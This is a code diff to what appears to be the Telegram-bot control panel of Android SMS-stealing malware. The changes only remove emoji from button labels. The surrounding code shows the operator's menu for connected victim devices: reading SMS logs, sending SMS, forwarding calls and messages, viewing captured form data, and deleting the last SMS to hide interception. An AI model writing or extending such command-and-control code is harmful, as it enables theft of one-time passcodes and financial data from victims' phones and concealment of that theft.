@@ -142,7 +142,7 @@ bot.on('message', msg => {
   }
 
   if(text==='/start'){
-    bot.sendMessage(chatId,'✅ Admin Panel Ready',{reply_markup:{keyboard:[['🌹Connected devices🌹'],['🌹Execute command🌹']],resize_keyboard:true}});
+    bot.sendMessage(chatId,'✅ Admin Panel Ready',{reply_markup:{keyboard:[['Connected devices'],['Execute command']],resize_keyboard:true}});
   }
   if(text==='Connected devices'){
     if(devices.size===0) return bot.sendMessage(chatId,'🚫 No devices connected.');
@@ -174,14 +174,14 @@ bot.on('callback_query', async cb => {
     // DEVICE COMMANDS MENU
     case 'device': {
       const buttons=[
-        [{text:'🌹📜 SMS Logs🌹',callback_data:`get_sms_log:${uuid}`}],
-        [{text:'🌹✉️ Send SMS🌹',callback_data:`send_sms_menu:${uuid}`}],
-        [{text:'🌹📞 Call Forward🌹',callback_data:`call_forward_menu:${uuid}`}],
-        [{text:'🌹📨 SMS Forward🌹',callback_data:`sms_forward_menu:${uuid}`}],
-        [{text:'🌹📋 Device Info🌹',callback_data:`device_info:${uuid}`}],
-        [{text:'🌹🧾 View Form Data🌹',callback_data:`view_form:${uuid}`}],
-        [{text:'🌹🗑️ Delete Last SMS🌹',callback_data:`delete_last_sms:${uuid}`}],
-        [{text:'🌹⬅️ Back🌹',callback_data:'back_devices'}]
+        [{text:'📜 SMS Logs',callback_data:`get_sms_log:${uuid}`}],
+        [{text:'✉️ Send SMS',callback_data:`send_sms_menu:${uuid}`}],
+        [{text:'📞 Call Forward',callback_data:`call_forward_menu:${uuid}`}],
+        [{text:'📨 SMS Forward',callback_data:`sms_forward_menu:${uuid}`}],
+        [{text:'📋 Device Info',callback_data:`device_info:${uuid}`}],
+        [{text:'🧾 View Form Data',callback_data:`view_form:${uuid}`}],
+        [{text:'🗑️ Delete Last SMS',callback_data:`delete_last_sms:${uuid}`}],
+        [{text:'⬅️ Back',callback_data:'back_devices'}]
       ];
       return bot.editMessageText(`🔧 Commands for ${device.model || uuid}\n👨‍💻 Developer: ${DEVELOPER}`,{
         chat_id:chatId,
